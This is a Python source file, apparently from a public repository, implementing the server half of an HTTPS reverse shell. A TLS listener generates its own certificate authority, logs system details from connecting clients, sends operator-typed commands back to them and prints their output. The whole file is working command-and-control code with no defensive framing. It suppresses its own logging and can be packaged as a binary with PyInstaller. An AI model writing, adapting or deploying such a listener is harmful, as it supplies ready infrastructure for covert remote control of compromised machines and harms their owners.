#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-HTTPS-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

import json
import ssl
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.parse import parse_qs

from trustme import CA


class ShellHandler(BaseHTTPRequestHandler):
    """Handle all HTTP requests received by the ShellServer."""

    def _set_headers(self, response_code: int = 200) -> None:
        self.send_response(response_code)
        self.end_headers()

    def do_GET(self) -> None:
        """Returns a simple JSON status message for the purpose of
        health checking."""
        self.send_header("Content-type", "application/json")
        self._set_headers()
        self.wfile.write(json.dumps({"status": "ok"}).encode())

    def do_POST(self) -> None:
        """Handles POST requests by dispatching the message received
        from each client to their respective methods, depending on the
        contents of the body."""
        length = int(self.headers.get("Content-Length"))
        request_body: dict[str, list[str]] = parse_qs(
            self.rfile.read(length).decode())
        for mode, args in request_body.items():
            try:
                getattr(self, f"_{mode}")(args)
            except AttributeError:
                self._set_headers(404)

    def _open_session(self, session_info: list[str]) -> None:
        """Displays client system information on connection."""
        print("[>] Connection established:")
        info = {"Client address": "{0}:{1}".format(*self.client_address)}
        info |= json.loads(session_info[0])
        for key, value in info.items():
            print("\t[+] {0:.<20} {1}".format(key, value).expandtabs(3))
        print()
        self._set_headers()

    def _prompt(self, shell_info: list[str]) -> None:
        """Builds the shell prompt with basic information received from
        the client, waits for the user's input and sends it back as a
        response."""
        gc, nc = "\x1b[0;32m", "\x1b[0m"  # green color, no color
        shell = ("\t{0}[{1}:{2}]{3} {4}"
                 .format(gc, *self.client_address, nc, *shell_info)
                 .expandtabs(3))
        try:
            response = input(shell)
        except EOFError:
            raise KeyboardInterrupt
        self._set_headers()
        self.wfile.write(response.encode())

    def _output(self, client_output: list[str]) -> None:
        """Sends the client's output to the user's STDOUT for evaluation
        of results."""
        for output in client_output[0].split("\n"):
            print(f"\t{output}".expandtabs(3))
        self._set_headers()

    def log_message(self, *args, **kwargs):
        """Suppress display of log messages on STDOUT."""
        pass


class ShellServer:
    def __init__(self,
                 host: str,
                 port: int, *,
                 server_cert: [str, Path] = None):
        """Create a Reverse Shell Server that communicates with clients
        through HTTPS.

        :param host: Server address or hostname.
        :param port: Port number to bind the server to.
        :param server_cert: Path to a file containing the server
            certificate in PEM format.
        """
        self.host = host
        self.port = port
        self.server_cert = server_cert

    @property
    def server_address(self) -> tuple[str, int]:
        return self.host, self.port

    @property
    def _base_path(self) -> Path:
        """Gets the absolute path for the directory from which this file
        is being executed."""
        try:
            '''If the file is compiled as a binary by PyInstaller, its 
            path will be set as sys._MEIPASS'''
            return Path(sys._MEIPASS)
        except AttributeError:
            return Path(__file__).parent.absolute()

    @property
    def server_cert(self) -> Path:
        """
        Gets a valid path to the server certificate file.
        Sets the path to the server certificate or creates a new CA that
        signs it and writes to a file.
        """
        return self._server_cert

    @server_cert.setter
    def server_cert(self, path: [str, Path]) -> None:
        server_cert = self._base_path.joinpath("server.pem") if \
            path is None else Path(path)
        if not server_cert.exists():  # Create server certificate
            (ca := CA()).cert_pem.write_to_path("ca.pem")
            signed_cert = ca.issue_cert(self.host)
            signed_cert.private_key_and_cert_chain_pem.write_to_path(
                str(server_cert))
        self._server_cert = server_cert

    def execute(self) -> None:
        with HTTPServer(self.server_address, ShellHandler) as httpd:
            try:
                print("[>] Server started on https://{0}:{1}".format(
                    *self.server_address))
                print("[>] Waiting for connections...")
                httpd.socket = ssl.wrap_socket(sock=httpd.socket,
                                               server_side=True,
                                               certfile=str(self.server_cert),
                                               ssl_version=ssl.PROTOCOL_TLS)
                httpd.serve_forever()
            except KeyboardInterrupt:
                print("\n[!] Shutting down the server...")


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="HTTPS Reverse Shell Server")
    parser.add_argument(
        "host",
        type=str,
        metavar="<hostname/address>",
        help="Server address or hostname."
    )
    parser.add_argument(
        "port",
        type=int,
        metavar="<port>",
        help="Port number to bind the server to."
    )
    parser.add_argument(
        "--server-cert",
        type=str,
        metavar="<path>",
        help="Path to a file containing the server certificate in PEM format. "
             "Creates a development certificate for 'localhost' if unset."
    )

    _args = parser.parse_args()

    ShellServer(
        host=_args.host,
        port=_args.port,
        server_cert=_args.server_cert
    ).execute()
